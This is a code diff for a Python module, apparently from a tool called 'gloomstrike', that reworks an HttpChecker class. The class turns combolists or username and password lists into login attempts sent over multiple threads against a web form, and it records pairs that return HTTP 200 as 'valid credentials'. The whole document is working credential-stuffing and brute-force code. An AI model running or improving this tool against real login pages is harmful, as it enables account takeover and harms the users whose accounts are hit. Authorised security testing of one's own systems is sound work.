@@ -1,4 +1,4 @@
-import mmap, requests, threading, time
+import requests, threading, time, random
 from gloomstrike import logger, helpers
 
 class Proxy:
@@ -12,11 +12,11 @@ class Proxy:
 
 class HttpChecker:
 
-    def __init__(self, url: str, csrf: str=None, parameters: list[list[str, str]]=None, logger: logger.Logger=None) -> None:
+    def __init__(self, url: str, params: str, csrf: str=None, logger: logger.Logger=None) -> None:
 
         self._url = url
         self._csrf = csrf
-        self._parameters = parameters
+        self._params = params
         self._logger = logger
 
         self._credentials = helpers.QueueHandler()
@@ -29,36 +29,59 @@ class HttpChecker:
         self._usernames = None
         self._passwords = None
 
-    def load(self, combolist: str, usernames: str, passwords: str, proxies: str):
+    def load(self, combolist_path: str, usernames_path: str, passwords_path: str, proxies_path: str):
+
+        combolist = []
+        usernames = []
+        passwords = []
 
         try:
 
-            if combolist:
+            if combolist_path:
 
-                with open(combolist, 'r+b') as f:
+                with open(combolist_path, 'r+b') as f:
 
-                    while combo := f.readline().rstrip():
+                    while line := f.readline().rstrip():
 
-                        if not ':' in combo:
+                        if not ':' in line:
                             continue
 
-                        username, password = combo.split(':')
+                        username, password = line.split(':')
 
-                        self._credentials.add([username, password])
+                        try:
 
+                            self._credentials.add([username.decode('utf-8'), password.decode('utf-8')])
+
+                        except UnicodeDecodeError as r:
+                            self._logger.error(f'Failed to decode {line}: {e}')
+                    
                 return True
+            
+            elif usernames_path and passwords_path:
 
-            elif usernames and passwords:
-                
-                with open(usernames, 'r+b') as f_usernames:
+                with open(usernames_path, 'r+b') as f:
 
-                    while username := f_usernames.readline().rstrip():
+                    while line := f.readline().rstrip():
 
-                        with open(passwords, 'r+b') as f_passwords:
+                        usernames.append(line)
 
-                            while password := f_passwords.readline().rstrip():
+                with open(passwords_path, 'r+b') as f:
+                    
+                    while line := f.readline().rstrip():
 
-                                self._credentials.add([username, password])
+                        passwords.append(line)
+
+                for username in usernames:
+
+                    for password in passwords:
+
+                        try:
+
+                            self._credentials.add([username.decode('utf-8'), password.decode('utf-8')])
+
+                        except UnicodeDecodeError as r:
+                            self._logger.error(f'Failed to decode {line}: {e}')
+
                 return True
 
         except Exception as e:
@@ -68,36 +91,59 @@ class HttpChecker:
 
     def _background(self):
 
-        try:
-            time.sleep(1 / 1000)
-        except KeyboardInterrupt:
-            self._event.set()
+        while not self._event.is_set():
+
+            try:
+
+                time.sleep(1 / 1000)
+
+            except KeyboardInterrupt:
+
+                self._event.set()
 
         for thread in self._threads:
             thread.join()
 
         return self._results
 
-    def _check(self, url: str, username: str, password: str, parameters: list[list[str, str]]):
+    def _parse_params(self, params: str) -> dict:
 
-        resp = requests.post(url, data={parameters[0]: username, parameters[1]: password})
+        data = {}
 
-        return resp
+        for param in params.split('&'):
+            
+            if '=' in param:
+
+                k, v = param.split('=', 1)
+                data[k] = v
+                
+        return data
+
+    def _check(self, url: str, username: str, password: str) -> bool:
+
+        params = self._params.replace('$USERNAME', username)
+        params = params.replace('$PASSWORD', password)
+
+        data = self._parse_params(params)
+
+        resp = requests.post(url,  data=data)
+
+        if resp.status_code == 200:
+            return True
 
     def _checker(self):
+            
+        for username, password in self._credentials:
 
-        while not self._event.is_set():
+            if self._event.is_set():
+                break
 
-            for username, password in self._credentials:
+            self._logger.info(f'{username}:{password}', end='\r', flush=True)
 
-                print(username, password)
+            if result := self._check(self._url, username, password):
 
-                if not (result := self._check(self._url, username, password, self._parameters)):
-                    continue
-
-                print(result.text)
-
-            time.sleep(1 / 1000)
+                self._results.append([username, password])
+                self._logger.info(f'Found valid credentials "{username}:{password}"')
 
     def start(self, threads: int, background: bool=False):
 
